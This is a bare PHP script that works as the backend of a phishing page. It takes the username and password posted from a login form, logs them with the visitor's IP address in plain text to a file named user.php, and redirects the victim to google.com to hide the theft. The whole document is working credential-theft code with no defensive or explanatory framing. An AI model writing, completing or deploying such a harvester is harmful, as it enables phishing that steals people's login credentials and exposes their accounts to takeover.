<?php

$user = $_POST['username'];
$pass = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR']; // Corrected the assignment operator.
$file = 'user.php';
$handle = fopen($file, 'a+');
$data = "\nIP Address: $ip\nUsername: $user\nPassword: $pass\n----------------------------------\n";

fwrite($handle, $data);
fclose($handle);

header("Location: https://google.com");
exit;
